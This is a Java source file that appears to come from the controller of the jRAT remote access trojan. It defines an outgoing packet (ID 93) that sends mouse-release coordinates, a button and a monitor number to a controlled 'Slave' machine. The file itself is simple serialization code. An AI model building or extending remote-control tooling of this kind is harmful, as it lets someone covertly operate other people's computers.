package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet93MouseRelease extends AbstractOutgoingPacket {

	private int x;
	private int y;
	private int button;
	private int monitor;

	public Packet93MouseRelease(int x, int y, int button, int monitor) {
		this.x = x;
		this.y = y;
		this.button = button;
		this.monitor = monitor;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(x);
		dos.writeInt(y);
		dos.writeInt(button);
		dos.writeInt(monitor);
	}

	@Override
	public short getPacketId() {
		return 93;
	}

}